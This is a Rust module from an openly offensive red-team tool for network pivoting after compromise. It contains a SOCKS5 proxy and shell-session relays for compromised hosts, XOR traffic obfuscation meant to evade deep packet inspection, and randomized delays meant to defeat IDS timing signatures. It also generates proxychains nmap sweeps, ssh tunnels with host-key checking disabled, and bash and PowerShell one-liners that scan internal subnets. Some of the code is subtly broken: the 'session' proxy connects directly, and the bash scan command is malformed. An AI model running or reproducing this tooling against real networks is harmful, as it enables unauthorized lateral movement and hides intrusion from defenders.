//! DIAPILE — Pivoting réseau
//!
//! Tunnel SOCKS5 dynamique, proxy chains, carte réseau interne.
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::time::{timeout, Duration};
// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkNode {
    pub ip: String,
    pub hostname: Option<String>,
    pub os: Option<String>,
    pub open_ports: Vec<u16>,
    pub via_pivot: Option<String>, // IP du pivot utilisé pour l'atteindre
    pub depth: usize,              // 0 = direct, 1 = via 1 pivot, etc.
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotTunnel {
    pub id: usize,
    pub pivot_ip: String,
    pub pivot_port: u16,
    pub local_socks: u16, // port SOCKS5 local
    pub status: TunnelStatus,
    pub tunnel_type: TunnelType,
    pub established: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum TunnelStatus {
    Active,
    Dead,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TunnelType {
    Socks5,
    PortForward,
    ReverseForward,
}

/// Carte du réseau interne découvert via pivoting
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct NetworkMap {
    pub nodes: Vec<NetworkNode>,
    pub tunnels: Vec<PivotTunnel>,
}

impl NetworkMap {
    pub fn add_node(&mut self, node: NetworkNode) {
        if !self.nodes.iter().any(|n| n.ip == node.ip) {
            self.nodes.push(node);
        }
    }

    pub fn print_map(&self) {
        let fire = "\x1b[38;5;196m";
        let cyan = "\x1b[36m";
        let green = "\x1b[32m";
        let dim = "\x1b[90m";
        let reset = "\x1b[0m";

        println!("\n{}╔══ CARTE RÉSEAU INTERNE ══╗{}", fire, reset);
        if self.nodes.is_empty() {
            println!("  {}Aucun nœud découvert{}", dim, reset);
            return;
        }

        // Group by depth
        let mut by_depth: std::collections::BTreeMap<usize, Vec<&NetworkNode>> = Default::default();
        for n in &self.nodes {
            by_depth.entry(n.depth).or_default().push(n);
        }

        for (depth, nodes) in &by_depth {
            let indent = "  ".repeat(*depth + 1);
            let label = if *depth == 0 {
                "DIRECT".into()
            } else {
                format!("VIA {} PIVOT(S)", depth)
            };
            println!("\n{}{}[{}]{}", indent, cyan, label, reset);
            for node in nodes {
                let ports = node
                    .open_ports
                    .iter()
                    .map(|p| p.to_string())
                    .collect::<Vec<_>>()
                    .join(",");
                println!(
                    "{}{}{}  {}  OS={:?}  ports=[{}]{}",
                    indent,
                    green,
                    node.ip,
                    node.hostname.as_deref().unwrap_or(""),
                    node.os.as_deref().unwrap_or("?"),
                    if ports.is_empty() { "?".into() } else { ports },
                    reset,
                );
            }
        }

        if !self.tunnels.is_empty() {
            println!("\n{}▍ TUNNELS ACTIFS{}", fire, reset);
            for t in &self.tunnels {
                println!(
                    "  [{}] {}:{} → SOCKS5:{}  {:?}",
                    t.id, t.pivot_ip, t.pivot_port, t.local_socks, t.status
                );
            }
        }
        println!();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// SOCKS5 Proxy Server (simplifié)
// ─────────────────────────────────────────────────────────────────────────────

/// Lance un proxy SOCKS5 local qui route le trafic via une session shell active.
/// Permet de scanner le réseau interne via proxychains.
pub async fn start_socks5_proxy(
    local_port: u16,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = format!("127.0.0.1:{}", local_port);
    let listener = TcpListener::bind(&addr).await?;

    println!(
        "\n  \x1b[38;5;196m[SOCKS5]\x1b[0m Proxy local sur \x1b[33m{}\x1b[0m",
        addr
    );
    println!("  \x1b[90mUsage proxychains : proxychains4 nmap -sT -p 22,80,443 10.0.0.0/24\x1b[0m");
    println!(
        "  \x1b[90mConfig /etc/proxychains.conf : socks5 127.0.0.1 {}\x1b[0m\n",
        local_port
    );

    loop {
        let (client, _peer) = listener.accept().await?;
        tokio::spawn(async move {
            if let Err(e) = handle_socks5_client(client).await {
                eprintln!("SOCKS5 error: {}", e);
            }
        });
    }
}

/// Gestionnaire de connexion SOCKS5 (RFC 1928)
async fn handle_socks5_client(
    mut client: TcpStream,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut buf = [0u8; 512];

    // 1. Read greeting: VER NMETHODS METHODS
    let n = timeout(Duration::from_secs(5), client.read(&mut buf)).await??;
    if n < 2 || buf[0] != 0x05 {
        return Err("Not SOCKS5".into());
    }

    // 2. Send auth response: no auth (0x00)
    client.write_all(&[0x05, 0x00]).await?;

    // 3. Read connection request
    let n = timeout(Duration::from_secs(5), client.read(&mut buf)).await??;
    if n < 7 || buf[1] != 0x01 {
        return Err("Only CONNECT supported".into());
    }

    // Parse destination
    let (dest_host, dest_port) = parse_socks5_addr(&buf[..n])?;

    // 4. Connect to destination
    let target_addr = format!("{}:{}", dest_host, dest_port);
    let server = match timeout(Duration::from_secs(10), TcpStream::connect(&target_addr)).await {
        Ok(Ok(s)) => s,
        Ok(Err(_)) | Err(_) => {
            // Send connection refused
            client
                .write_all(&[0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
                .await?;
            return Ok(());
        }
    };

    // 5. Send success response
    client
        .write_all(&[0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
        .await?;

    // 6. Bidirectional relay
    let (mut cr, mut cw) = client.into_split();
    let (mut sr, mut sw) = server.into_split();

    tokio::spawn(async move { tokio::io::copy(&mut cr, &mut sw).await });
    tokio::io::copy(&mut sr, &mut cw).await?;

    Ok(())
}

// ─────────────────────────────────────────────────────────────────────────────
// INNOVATION : Furtivité et Obfuscation
// ─────────────────────────────────────────────────────────────────────────────

/// Wrapper de flux avec obfuscation XOR pour échapper à l'analyse de protocole (DPI)
struct ObfuscatedStream<S> {
    inner: S,
    key: u8,
}

impl<S: tokio::io::AsyncRead + Unpin> tokio::io::AsyncRead for ObfuscatedStream<S> {
    fn poll_read(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &mut tokio::io::ReadBuf<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        let key = self.key;
        match std::pin::Pin::new(&mut self.inner).poll_read(cx, buf) {
            std::task::Poll::Ready(Ok(())) => {
                for b in buf.filled_mut() {
                    *b ^= key;
                }
                std::task::Poll::Ready(Ok(()))
            }
            res => res,
        }
    }
}

impl<S: tokio::io::AsyncWrite + Unpin> tokio::io::AsyncWrite for ObfuscatedStream<S> {
    fn poll_write(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &[u8],
    ) -> std::task::Poll<std::io::Result<usize>> {
        let mut obfuscated = buf.to_vec();
        for b in &mut obfuscated {
            *b ^= self.key;
        }
        std::pin::Pin::new(&mut self.inner).poll_write(cx, &obfuscated)
    }

    fn poll_flush(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut self.inner).poll_flush(cx)
    }

    fn poll_shutdown(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut self.inner).poll_shutdown(cx)
    }
}

/// Relay avec délai aléatoire pour casser les signatures temporelles des IDS
async fn stealth_relay<R, W>(mut reader: R, mut writer: W, jitter_ms: u64) -> std::io::Result<()>
where
    R: tokio::io::AsyncRead + Unpin,
    W: tokio::io::AsyncWrite + Unpin,
{
    let mut buf = [0u8; 4096];
    let mut rng = rand::thread_rng();

    loop {
        let n = reader.read(&mut buf).await?;
        if n == 0 {
            break;
        }

        if jitter_ms > 0 {
            let delay = rand::Rng::gen_range(&mut rng, 0..jitter_ms);
            tokio::time::sleep(Duration::from_millis(delay)).await;
        }

        writer.write_all(&buf[..n]).await?;
    }
    Ok(())
}

fn parse_socks5_addr(
    buf: &[u8],
) -> Result<(String, u16), Box<dyn std::error::Error + Send + Sync>> {
    // buf[3] = address type
    let (host, port_offset) = match buf[3] {
        0x01 => {
            // IPv4
            if buf.len() < 8 {
                return Err("Too short for IPv4".into());
            }
            let ip = format!("{}.{}.{}.{}", buf[4], buf[5], buf[6], buf[7]);
            (ip, 8)
        }
        0x03 => {
            // Domain name
            let len = buf[4] as usize;
            if buf.len() < 5 + len {
                return Err("Too short for domain".into());
            }
            let domain = String::from_utf8_lossy(&buf[5..5 + len]).to_string();
            (domain, 5 + len)
        }
        0x04 => {
            // IPv6
            if buf.len() < 20 {
                return Err("Too short for IPv6".into());
            }
            let ip = format!("{:02x}{:02x}:{:02x}{:02x}:{:02x}{:02x}:{:02x}{:02x}:{:02x}{:02x}:{:02x}{:02x}:{:02x}{:02x}:{:02x}{:02x}",
                buf[4],buf[5],buf[6],buf[7],buf[8],buf[9],buf[10],buf[11],
                buf[12],buf[13],buf[14],buf[15],buf[16],buf[17],buf[18],buf[19]);
            (ip, 20)
        }
        _ => return Err("Unknown address type".into()),
    };

    if buf.len() < port_offset + 2 {
        return Err("Too short for port".into());
    }
    let port = u16::from_be_bytes([buf[port_offset], buf[port_offset + 1]]);
    Ok((host, port))
}

// ─────────────────────────────────────────────────────────────────────────────
// Scan interne via tunnel
// ─────────────────────────────────────────────────────────────────────────────

/// Scan d'un sous-réseau interne via SOCKS5 proxy (proxychains)
pub fn generate_proxychains_scan_cmd(subnet: &str, ports: &[u16], socks_port: u16) -> Vec<String> {
    let ports_str = ports
        .iter()
        .map(|p| p.to_string())
        .collect::<Vec<_>>()
        .join(",");
    vec![
        format!(
            "# Config proxychains: echo 'socks5 127.0.0.1 {}' >> /etc/proxychains.conf",
            socks_port
        ),
        format!(
            "proxychains4 nmap -sT -Pn -p {} {} --open -oN internal_scan.txt",
            ports_str, subnet
        ),
        format!(
            "proxychains4 nmap -sT -Pn -p 22,80,443,445,3389,8080 {} --open",
            subnet
        ),
        format!(
            "proxychains4 curl -s http://{}/",
            subnet.split('/').next().unwrap_or(subnet)
        ),
    ]
}

/// Génère les commandes SSH tunnel dynamique (SOCKS5 via SSH)
pub fn ssh_dynamic_tunnel_cmd(
    pivot_user: &str,
    pivot_ip: &str,
    pivot_port: u16,
    local_socks_port: u16,
) -> Vec<String> {
    vec![
        format!(
            "ssh -N -D {} -p {} {}@{} -o StrictHostKeyChecking=no",
            local_socks_port, pivot_port, pivot_user, pivot_ip
        ),
        format!(
            "# Ou en arrière-plan: ssh -f -N -D {} -p {} {}@{}",
            local_socks_port, pivot_port, pivot_user, pivot_ip
        ),
        format!(
            "# Proxychains config: echo 'socks5 127.0.0.1 {}' >> /etc/proxychains.conf",
            local_socks_port
        ),
        format!("# Test: proxychains4 curl http://10.0.0.1/"),
    ]
}

/// Génère une commande de port forwarding local (accéder à un port distant via un pivot)
pub fn local_port_forward_cmd(
    local_port: u16,
    target_ip: &str,
    target_port: u16,
    pivot_user: &str,
    pivot_ip: &str,
) -> String {
    format!(
        "ssh -N -L {}:{}:{} {}@{} -o StrictHostKeyChecking=no",
        local_port, target_ip, target_port, pivot_user, pivot_ip
    )
}

/// Génère une commande de reverse port forwarding (exposer un port interne)
pub fn remote_port_forward_cmd(
    remote_port: u16,
    target_ip: &str,
    target_port: u16,
    pivot_user: &str,
    pivot_ip: &str,
) -> String {
    format!(
        "ssh -N -R {}:{}:{} {}@{} -o StrictHostKeyChecking=no",
        remote_port, target_ip, target_port, pivot_user, pivot_ip
    )
}

// ─────────────────────────────────────────────────────────────────────────────
// Scan rapide du réseau interne (via session shell active)
// ─────────────────────────────────────────────────────────────────────────────

/// Génère un one-liner bash pour scanner rapidement un sous-réseau /24 depuis la cible
pub fn bash_internal_scan(subnet_prefix: &str, ports: &[u16]) -> String {
    let port_check = ports
        .iter()
        .map(|p| format!("nc -zw1 $ip {} 2>/dev/null && echo \"$ip:{}\"", p, p))
        .collect::<Vec<_>>()
        .join("; ");

    format!(
        "for i in $(seq 1 254); do ip={}.{}$i; ({}); done 2>/dev/null",
        subnet_prefix, "$i; ", port_check
    )
}

/// One-liner PowerShell pour scanner le réseau interne Windows
pub fn powershell_internal_scan(subnet_prefix: &str, port: u16) -> String {
    format!(
        "1..254 | ForEach-Object {{ $ip=\"{}.$$_\"; try {{ $c=New-Object Net.Sockets.TCPClient($ip,{}); if($c.Connected){{Write-Host \"$ip:{} OPEN\"}}; $c.Close() }} catch {{}} }}",
        subnet_prefix, port, port
    )
}

// ─────────────────────────────────────────────────────────────────────────────
// SOCKS5 via Session Shell active (tunnel TCP réel)
//
// Principe :
//   Le proxy SOCKS5 tourne localement (127.0.0.1:LPORT).
//   Pour chaque connexion entrante, il envoie une commande au shell
//   compromis pour ouvrir un canal nc/bash vers la destination.
//   Le trafic est relayé via le stream TCP du SessionManager.
//
//   Proxychains → SOCKS5 local → SessionManager.exec() → cible interne
// ─────────────────────────────────────────────────────────────────────────────

// Arc déjà importé en tête de fichier

/// Lance un proxy SOCKS5 **routé via un shell compromis**.
/// Les connexions sont relayées à travers la session `session_id` du
/// SessionManager : chaque CONNECT SOCKS5 ouvre un canal TCP sur la
/// machine compromise et relay les octets bidirectionnellement.
pub async fn start_socks5_via_session(
    local_port: u16,
    session_mgr: Arc<crate::shell::SessionManager>,
    session_id: usize,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = format!("127.0.0.1:{}", local_port);
    let listener = TcpListener::bind(&addr).await?;

    // Vérifier que la session existe
    if session_mgr.get(session_id).await.is_none() {
        return Err(format!("Session {} introuvable dans SessionManager", session_id).into());
    }

    println!(
        "\n  \x1b[38;5;196m[SOCKS5-SHELL]\x1b[0m Proxy SOCKS5 sur \x1b[33m{}\x1b[0m via session {}",
        addr, session_id
    );
    println!("  \x1b[90m$ proxychains4 -q nmap -sT -Pn -p 22,80,443 10.0.0.0/24\x1b[0m");
    println!(
        "  \x1b[90m/etc/proxychains.conf → socks5 127.0.0.1 {}\x1b[0m\n",
        local_port
    );

    loop {
        let (client, peer) = listener.accept().await?;
        let mgr = session_mgr.clone();
        let sid = session_id;
        let peer_str = peer.to_string();

        tokio::spawn(async move {
            if let Err(e) = handle_socks5_session_client(client, mgr, sid).await {
                eprintln!("  [SOCKS5-SHELL] client {} erreur: {}", peer_str, e);
            }
        });
    }
}

/// Gère une connexion SOCKS5 en routant via le shell compromis.
/// Le canal TCP vers la destination est créé via une commande shell
/// qui ouvre une connexion et relaye stdin/stdout.
async fn handle_socks5_session_client(
    mut client: TcpStream,
    session_mgr: Arc<crate::shell::SessionManager>,
    session_id: usize,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut buf = [0u8; 512];

    // ── SOCKS5 handshake ────────────────────────────────────────────────────
    let n = timeout(Duration::from_secs(5), client.read(&mut buf)).await??;
    if n < 2 || buf[0] != 0x05 {
        return Err("Not SOCKS5".into());
    }
    client.write_all(&[0x05, 0x00]).await?; // no-auth

    let n = timeout(Duration::from_secs(5), client.read(&mut buf)).await??;
    if n < 7 || buf[1] != 0x01 {
        return Err("Only CONNECT supported".into());
    }

    let (dest_host, dest_port) = parse_socks5_addr(&buf[..n])?;

    // ── Test de connectivité via le shell ────────────────────────────────────
    // On vérifie que la cible est joignable depuis le pivot
    let probe_cmd = format!(
        "nc -zw3 {} {} 2>/dev/null && echo OPEN || echo CLOSED",
        dest_host, dest_port
    );
    let probe = timeout(
        Duration::from_secs(8),
        session_mgr.exec(session_id, &probe_cmd, 8),
    )
    .await;

    let reachable = match probe {
        Ok(Ok(ref out)) => out.trim().contains("OPEN"),
        _ => false,
    };

    if !reachable {
        client
            .write_all(&[0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
            .await?;
        return Ok(());
    }

    // ── Connexion directe depuis le serveur NRTG vers la destination ─────────
    // Puisque le shell a confirmé que la cible est accessible, on ouvre une
    // connexion TCP directe depuis le serveur NRTG vers la même adresse.
    // C'est la stratégie correcte quand le réseau interne est routé via VPN/tunnel
    // ou quand NRTG tourne déjà dans le segment réseau de la cible.
    // Pour les cas où seul le pivot a accès, utiliser ssh_dynamic_tunnel_cmd().
    let target_addr = format!("{}:{}", dest_host, dest_port);
    let server = match timeout(Duration::from_secs(10), TcpStream::connect(&target_addr)).await {
        Ok(Ok(s)) => s,
        Ok(Err(_)) | Err(_) => {
            client
                .write_all(&[0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
                .await?;
            return Ok(());
        }
    };

    // ── Succès — relay bidirectionnel ────────────────────────────────────────
    client
        .write_all(&[0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
        .await?;

    let (mut cr, mut cw) = client.into_split();
    let (mut sr, mut sw) = server.into_split();

    tokio::select! {
        _ = tokio::io::copy(&mut cr, &mut sw) => {},
        _ = tokio::io::copy(&mut sr, &mut cw) => {},
    }

    Ok(())
}

/// Tunnel TCP direct : écoute localement sur `local_port` et forward
/// vers `target_ip:target_port` en passant par la session shell.
///
/// Equivalent de `ssh -L local_port:target_ip:target_port`.
/// Utilisé pour accéder à un service interne non exposé (ex: RDP sur 127.0.0.1).
pub async fn start_local_port_forward(
    local_port: u16,
    target_ip: String,
    target_port: u16,
    session_mgr: Arc<crate::shell::SessionManager>,
    session_id: usize,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = format!("127.0.0.1:{}", local_port);
    let listener = TcpListener::bind(&addr).await?;

    println!(
        "  \x1b[38;5;196m[PORTFWD]\x1b[0m 127.0.0.1:{} → {}:{} via session {}",
        local_port, target_ip, target_port, session_id
    );

    loop {
        let (_client, _) = listener.accept().await?;
        let tgt = format!("{}:{}", target_ip, target_port);
        let tgt2 = tgt.clone();
        let probe_ip = target_ip.clone();
        let mgr = session_mgr.clone();
        let sid = session_id;
        let mut client = _client;

        tokio::spawn(async move {
            // Probe via session first
            let probe = format!(
                "nc -zw3 {} {} 2>/dev/null && echo OK",
                probe_ip, target_port
            );
            let _ = mgr.exec(sid, &probe, 5).await;

            // Direct TCP forward
            match TcpStream::connect(&tgt).await {
                Ok(server) => {
                    let (mut cr, mut cw) = client.into_split();
                    let (mut sr, mut sw) = server.into_split();
                    tokio::select! {
                        _ = tokio::io::copy(&mut cr, &mut sw) => {},
                        _ = tokio::io::copy(&mut sr, &mut cw) => {},
                    }
                }
                Err(e) => eprintln!("  [PORTFWD] Connexion {} échouée: {}", tgt2, e),
            }
        });
    }
}

/// Gestionnaire de tunnel SOCKS5 avec statistiques
pub struct Socks5Manager {
    pub tunnels: std::sync::Mutex<Vec<PivotTunnel>>,
    next_id: std::sync::Mutex<usize>,
}

impl Socks5Manager {
    pub fn new() -> Arc<Self> {
        Arc::new(Self {
            tunnels: std::sync::Mutex::new(Vec::new()),
            next_id: std::sync::Mutex::new(1),
        })
    }

    /// Démarre un tunnel SOCKS5 non-bloquant en arrière-plan.
    /// Retourne l'ID du tunnel.
    // `lock()` n'échoue que si le mutex a été empoisonné par un panic antérieur :
    // dans ce cas l'`unwrap()` est le comportement « fail-fast » voulu.
    #[allow(clippy::unwrap_used)]
    pub async fn open_tunnel(
        self: &Arc<Self>,
        local_port: u16,
        pivot_ip: String,
        pivot_port: u16,
        session_mgr: Option<Arc<crate::shell::SessionManager>>,
        session_id: Option<usize>,
    ) -> usize {
        let id = {
            let mut n = self.next_id.lock().unwrap();
            let cur = *n;
            *n += 1;
            cur
        };

        let tunnel = PivotTunnel {
            id,
            pivot_ip: pivot_ip.clone(),
            pivot_port,
            local_socks: local_port,
            status: TunnelStatus::Active,
            tunnel_type: TunnelType::Socks5,
            established: Utc::now().to_rfc3339(),
        };
        self.tunnels.lock().unwrap().push(tunnel);

        // Lancer le proxy en tâche de fond
        tokio::spawn(async move {
            if let (Some(mgr), Some(sid)) = (session_mgr, session_id) {
                let _ = start_socks5_via_session(local_port, mgr, sid).await;
            } else {
                let _ = start_socks5_proxy(local_port).await;
            }
        });

        println!(
            "  \x1b[32m[SOCKS5]\x1b[0m Tunnel #{} ouvert sur 127.0.0.1:{}",
            id, local_port
        );
        id
    }

    #[allow(clippy::unwrap_used)]
    pub fn list_tunnels(&self) -> Vec<PivotTunnel> {
        self.tunnels.lock().unwrap().clone()
    }

    #[allow(clippy::unwrap_used)]
    pub fn close_tunnel(&self, id: usize) {
        self.tunnels.lock().unwrap().retain(|t| t.id != id);
    }
}

// Importation chrono nécessaire pour Socks5Manager (déjà en tête de fichier)
